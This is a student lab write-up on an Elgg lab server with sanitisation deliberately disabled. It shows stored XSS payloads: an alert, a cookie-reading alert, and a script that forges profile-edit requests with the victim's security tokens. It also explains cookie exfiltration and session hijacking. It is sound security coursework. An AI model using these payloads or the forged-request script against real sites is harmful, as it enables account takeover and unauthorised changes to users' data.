\section{Exploiting Web Services using Cross-Site Scripting Attacks}

\drquestion{Q2.1}{Stored Cross-Site Scripting Proof of Concept}{%
  Embed a JavaScript program in Samy's \textquotedbl{}About me\textquotedbl{} field so that it displays an alert reading \textquotedbl{}Attack with XSS by\textquotedbl{} plus your student number when another user views his profile.
}

\dranswer

\paragraph{Vulnerability analysis:} Elgg's profile-edit form exposes two separate fields that the assignment's wording of \textquotedbl{}About me\textquotedbl{} could plausibly mean: a rich-text \textbf{About me} editor and a plain-text \textbf{Brief description} field beneath it. I tested the same payload in both; it was stored but never executed in About me, and it executed correctly in Brief description, so this answer targets that field. This lab's Docker image explains why: it modifies two stock Elgg files. Submitted profile input is normally passed through \texttt{filter\_tags()} in \texttt{engine/lib/input.php} before being written to the database, but that function has been overridden to do nothing:

\begin{lstlisting}[language=PHP]
function filter_tags($var) {
    // return elgg_trigger_plugin_hook('validate', 'input', null, $var);
    return $var;
}
\end{lstlisting}

so an unrecognised \texttt{<script>} tag is stored exactly as typed instead of being stripped by Elgg's htmLawed sanitiser. On the read side, every page that displays Brief description calls \texttt{views/default/output/text.php}, whose encoding call has also been commented out:

\begin{lstlisting}[language=PHP]
$value = elgg_extract('value', $vars);
if (!is_scalar($value)) {
    return;
}

//echo htmlspecialchars("{$value}", ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8', false);
echo "{$value}";
\end{lstlisting}

so the stored string is echoed into the HTML response as live markup instead of being converted to harmless entities by \texttt{htmlspecialchars()}. Because neither the write path nor the read path encodes the value, text saved in Brief description reaches every subsequent visitor's browser as executable markup rather than literal text -- a stored (persistent) cross-site scripting vulnerability that re-fires for every visitor who loads a page containing it, with no further action needed from the attacker after the initial save.

\paragraph{Exploiting the vulnerability:} While logged in as samy, I opened Edit profile and entered the following value in the Brief description field, leaving the About me editor empty, as shown in Figure~\ref{fig:q2-1-samy-payload}:

\begin{lstlisting}
<script>alert('Attack with XSS by s4041605');</script>
\end{lstlisting}

Saving this submits it to Elgg's profile-save action, which, because \texttt{filter\_tags()} no longer filters it, writes it unchanged into Samy's description metadata. Every later page that renders Brief description therefore embeds this exact markup verbatim in its HTML response. When a browser parses that response, reaching \texttt{<script>} switches it out of normal markup parsing and hands everything up to the matching \texttt{</script>} to the JavaScript engine as code rather than displayable text; the engine executes the single statement inside, calling the browser's built-in \texttt{alert()} function with the string \texttt{'Attack with XSS by s4041605'}, producing a modal dialog. This happens identically regardless of who is viewing the page, since the alert is generated by markup already embedded in the response, not by anything the viewer typed or clicked.

Figure~\ref{fig:q2-1-xss-alert} shows the alert already firing on Samy's own browser immediately after the \textquotedbl{}Your profile was successfully saved\textquotedbl{} confirmation, at \texttt{www.seed-server.com/profile/samy}, confirming execution happens automatically the first time the profile page is rendered. Figure~\ref{fig:q2-1-alice-alert} shows the same alert firing in a separate session logged in as Alice, triggered simply by opening the site's Members listing page rather than Samy's profile page directly; Elgg's Members list renders each user's Brief description as part of their card, so the unescaped script executes there too. This demonstrates that a script stored once in Samy's profile executes automatically for a different user, Alice, on any page that surfaces the field, without her submitting any input of her own.

\drquestion{Q2.2}{Session Cookie Disclosure via Stored XSS}{%
  Embed a JavaScript program in Samy's \textquotedbl{}About me\textquotedbl{} field so that it displays the viewing user's cookies in an alert when another user views his profile.
}

\dranswer

\paragraph{Vulnerability analysis:} This sub-question exploits the same missing controls identified in Q2.1: \texttt{filter\_tags()} in \texttt{engine/lib/input.php} no longer sanitises submitted profile input before it is stored, and \texttt{views/default/output/text.php} echoes the stored Brief description value with its \texttt{htmlspecialchars()} call commented out. Q2.1 already established that a \texttt{<script>} tag placed in that field is stored verbatim and re-executed, unmodified, in every visitor's browser on any page that renders it. This sub-question uses that same execution primitive with a different statement inside the tag: instead of a fixed string, \texttt{document.cookie} reads the cookies the victim's own browser is currently holding for \texttt{www.seed-server.com}, and passes that string into \texttt{alert()}. Because the payload runs inside the victim's browser, in the victim's own origin, it has exactly the same access to \texttt{document.cookie} that any legitimate script on the site would have -- the vulnerability is not in how cookies are read, but in the fact that Elgg lets an attacker plant arbitrary script into a page the victim's browser will trust and execute.

\paragraph{Exploiting the vulnerability:} While logged in as samy, I replaced the Brief description payload from Q2.1 with:

\begin{lstlisting}
<script>alert(document.cookie);</script>
\end{lstlisting}

as shown in Figure~\ref{fig:q2-2-samy-payload}. Saving this stores it unchanged in Samy's description metadata, for the same reason established in Q2.1. Figure~\ref{fig:q2-2-cookie-alert} shows the result on Samy's own browser immediately after saving, at \texttt{www.seed-server.com/profile/samy}: the alert reads \texttt{Elgg=9ke165c5mm3lm631nm1cs87hid}, Samy's own session cookie. Figure~\ref{fig:q2-2-alice-cookie-alert} shows the same payload firing in a separate session logged in as Alice, triggered by opening the Members listing page; the alert here reads a different value, \texttt{Elgg=9tdgj0mhjh168ktht35ivlgt2l}. The two alerts showing two different cookie values from two different logged-in sessions confirms that each victim's own browser executed \texttt{document.cookie} in its own security context and exposed its own session cookie, not Samy's.

\paragraph{Impact of obtaining the cookie:} \texttt{Elgg} is Elgg's session cookie: the server treats whoever presents a given session's cookie value as the corresponding logged-in user, without checking the password again. The alert box used here only proves the value is readable; it is not the only way to get it out. The identical injected statement could instead send \texttt{document.cookie} to a server the attacker controls, for example by setting it as the source of an off-site image tag or through a background \texttt{fetch()} request, which would exfiltrate the value silently, with no dialog box and no indication to the victim that anything happened. Once an attacker holds a captured value such as Alice's \texttt{Elgg=9tdgj0mhjh168ktht35ivlgt2l}, setting that same string as their own browser's cookie for \texttt{www.seed-server.com} and reloading the site would present Elgg's server with a session identifier it already recognises as Alice's, granting access to her account -- reading her private data, changing her profile, or acting as her -- without the attacker ever learning her password. This attack works here specifically because Alice's session cookie was readable by \texttt{document.cookie} in the first place, meaning it was not marked with the \texttt{HttpOnly} attribute that would otherwise have hidden it from JavaScript entirely.

\drquestion{Q2.3}{Construction of a Cross-Site Request Forgery Payload}{%
  Using Firefox's HTTP inspection tools on a legitimate profile edit, determine the three missing values needed to complete the supplied skeleton script that forges a profile-edit request from the victim's browser.
}

The assignment brief supplies the following skeleton JavaScript for the worm, leaving three \textquotedbl{}FILL-IN\textquotedbl{} fields for the values a legitimate profile-edit request actually uses:

\begin{lstlisting}
<script type='text/javascript'>
window.onload=function(){
    //JavaScript code to access user name, user guid, Time Stamp
    //__elgg_ts and Security Token __elgg_token
    var userName=elgg.session.user.name;
    var guid='&guid='+elgg.session.user.guid;
    var ts='&__elgg_ts='+elgg.security.token.__elgg_ts;
    var token='&__elgg_token='+elgg.security.token.__elgg_token;
    var desc='&description= *** '; //FILL-IN
    var name='&name='+userName;
    //Construct the content of your url.
    var sendurl='***'; //FILL-IN
    var content=token+ts+name+desc+guid;
    var samyGuid=***;     //FILL-IN
    if(elgg.session.user.guid!=samyGuid) {
          //Create and send Ajax request to modify profile
          var Ajax=null;
          Ajax=new XMLHttpRequest();
          Ajax.open('POST',sendurl,true)
          Ajax.setRequestHeader('Host','www.seed-server.com');
          Ajax.setRequestHeader('Content-Type',
                                'application/x-www-form-urlencoded');
          Ajax.send(content);
    }
}
</script>
\end{lstlisting}

\dranswer

\paragraph{Finding the required values:} While logged in as samy, I opened Firefox's Network tab, made a small edit on \texttt{profile/samy/edit} (typing \texttt{hello} into the About me editor), and saved it to capture the resulting POST request. Figure~\ref{fig:q2-3-http-request} shows the Headers panel for that request: it was sent to \texttt{http://www.seed-server.com/action/profile/edit}, which supplies the \texttt{sendurl} value. Figures~\ref{fig:q2-3-http-payload} and~\ref{fig:q2-3-http-payload-guid} show the request body, a \texttt{multipart/form-data} submission listing every profile field by name. Two details from this body matter for completing the skeleton. First, the field named \texttt{guid} is highlighted in Figure~\ref{fig:q2-3-http-payload-guid} with value \texttt{59}; since this request was Samy editing his own profile, \texttt{59} is Samy's own GUID, which supplies \texttt{samyGuid}. Second, the field actually named \texttt{description} in this Elgg build (visible in Figure~\ref{fig:q2-3-http-payload} holding \texttt{<p>hello</p>}, the text I typed) is the rich-text \textbf{About me} editor, not the \textbf{Brief description} field used in Q2.1 and Q2.2 -- that field is submitted separately as \texttt{briefdescription}. The skeleton's \texttt{desc} variable writes into \texttt{description}, so it targets About me specifically, and the assignment brief already specifies this value directly as the student's RMIT number.

One more difference is visible in Figure~\ref{fig:q2-3-http-request}: the browser sent this request as \texttt{multipart/\allowbreak{}form-data}, while the skeleton's own \texttt{Ajax.setRequestHeader} call declares \texttt{application/\allowbreak{}x-www-\allowbreak{}form-\allowbreak{}urlencoded}. This does not stop the forged request from working, because Elgg's PHP action handler reads submitted values from \texttt{\$\_POST} regardless of which encoding produced them, provided the \texttt{Content-Type} header correctly matches the body format actually sent -- which it does here, since the skeleton builds \texttt{content} as a plain \texttt{key=value\&key=value} string and labels it accordingly, rather than reproducing the browser's multipart framing.

\drfigure{figures/q2-3-http-payload.png}{The start of the request body, showing the security token, timestamp, name, and the \texttt{description} (About me) field.}{fig:q2-3-http-payload}

\drfigure{figures/q2-3-http-payload-guid.png}{The end of the request body, with the \texttt{guid} field highlighted.}{fig:q2-3-http-payload-guid}

\paragraph{Completed script:} Substituting \texttt{s4041605} for \texttt{desc}, the captured endpoint for \texttt{sendurl}, and \texttt{59} for \texttt{samyGuid} gives:

\begin{lstlisting}
<script type='text/javascript'>
window.onload=function(){
    //JavaScript code to access user name, user guid, Time Stamp
    //__elgg_ts and Security Token __elgg_token
    var userName=elgg.session.user.name;
    var guid='&guid='+elgg.session.user.guid;
    var ts='&__elgg_ts='+elgg.security.token.__elgg_ts;
    var token='&__elgg_token='+elgg.security.token.__elgg_token;
    var desc='&description=s4041605';
    var name='&name='+userName;
    //Construct the content of your url.
    var sendurl='http://www.seed-server.com/action/profile/edit';
    var content=token+ts+name+desc+guid;
    var samyGuid=59;
    if(elgg.session.user.guid!=samyGuid) {
          //Create and send Ajax request to modify profile
          var Ajax=null;
          Ajax=new XMLHttpRequest();
          Ajax.open('POST',sendurl,true)
          Ajax.setRequestHeader('Host','www.seed-server.com');
          Ajax.setRequestHeader('Content-Type',
                                'application/x-www-form-urlencoded');
          Ajax.send(content);
    }
}
</script>
\end{lstlisting}

The four remaining pieces of \texttt{content} -- \texttt{token}, \texttt{ts}, \texttt{name}, and \texttt{guid} -- are read dynamically from \texttt{elgg.session} and \texttt{elgg.security.token} at the moment the script runs in the victim's browser, so they always carry the viewing victim's own valid security token, timestamp, and GUID rather than Samy's, which is what allows this request to pass as the victim's own authenticated action when it later runs inside Alice's session in Q2.4. The \texttt{if} guard compares the viewer's GUID to Samy's fixed GUID (\texttt{59}) so that the script does not try to overwrite Samy's own profile when Samy himself happens to load the page.

\drquestion{Q2.4}{Automated Profile Modification via XSS Worm}{%
  Store the completed Q2.3 script in Samy's \textquotedbl{}About me\textquotedbl{} field so that it automatically injects your student number into another user's profile when they view his page.
}

\dranswer

\paragraph{Vulnerability analysis:} This sub-question combines the two vulnerabilities already established. Q2.1 showed that \texttt{filter\_tags()} and \texttt{output/text.php} let an attacker plant a \texttt{<script>} tag in Samy's Brief description that executes, unmodified, in every visitor's browser. Q2.3 showed that Elgg's profile-edit action can be triggered by any script running on the site, because the security token, timestamp, and GUID it requires are all readable from \texttt{elgg.session} and \texttt{elgg.security.token} in the current page. As with Q2.2's assignment's stated field, the question again refers to \textquotedbl{}About me\textquotedbl{}, but the completed worm from Q2.3 must itself be planted in \textbf{Brief description} to execute at all, for the same reason established in Q2.1; the field it writes into when it runs is \textbf{About me}, since that is what the \texttt{description} parameter in the forged request updates. What makes this a worm rather than just a self-contained alert is that the forged request needs no value stolen from anywhere: because the injected script runs inside the victim's own authenticated browser session, it already has direct access to that victim's own live token and GUID, the same values Elgg itself would supply if the victim clicked Save. The server therefore has no way to distinguish this request from a genuine one the victim intended to submit.

\paragraph{Exploiting the vulnerability:} The Brief description field only accepts a single line, so I minified the Q2.3 script onto one line before pasting it in: every \texttt{//} comment had to be removed first, since once joined onto one line a comment would silence everything typed after it, and I added one semicolon after \texttt{Ajax.open(...)} that the original, one-statement-per-line version relied on JavaScript's automatic semicolon insertion to supply. While logged in as samy, I pasted the resulting one-line script into Brief description and saved, as shown in Figure~\ref{fig:q2-4-samy-worm-payload}. Figure~\ref{fig:q2-4-samy-profile-after} shows Samy's own profile immediately afterwards: Brief description renders no visible text, because a \texttt{<script>} element produces no displayed output, only execution, consistent with Q2.1 and Q2.2.

To verify the attack from a victim's side, I first checked Alice's profile before any of this ran: Figure~\ref{fig:q2-4-alice-before} shows \texttt{profile/alice} with no About me or Brief description content at all. I then logged in as alice, opened Firefox's Network tab, and opened the Members listing, the same page that rendered Samy's payload in Q2.1 and Q2.2. Figure~\ref{fig:q2-4-alice-network} shows the result: a POST request to \texttt{action/profile/edit} fired automatically, with Initiator \texttt{members:41 (xhr)}, meaning it was issued by a script running on that page rather than by me submitting any form. Its form data shows \texttt{name: "Alice"}, \texttt{description: "s4041605"}, and \texttt{guid: "56"} -- Alice's own name and GUID, supplied automatically by the worm reading her active session, together with the injected student number. \texttt{56} also differs from the fixed \texttt{samyGuid} of \texttt{59} written into the script in Q2.3, so the worm's \texttt{if} guard correctly identified Alice as a different user from Samy and proceeded to send the forged request. Figure~\ref{fig:q2-4-alice-after} confirms the outcome: Alice's own profile now shows About me as \texttt{s4041605}, without Alice ever opening an edit form or clicking Save herself.

\paragraph{Conclusion:} The evidence demonstrates a working XSS worm: a script stored once in Samy's profile forged an authenticated profile-edit request from inside a different user's own browser session, using that victim's own security token and GUID, and changed her profile without her submitting any input of her own. This differs from the classic self-replicating Samy worm in scope: the version built here writes a fixed value into the victim's About me field and stops, rather than also copying itself into the victim's own profile to keep spreading to further visitors, since the assignment specifies only the former.
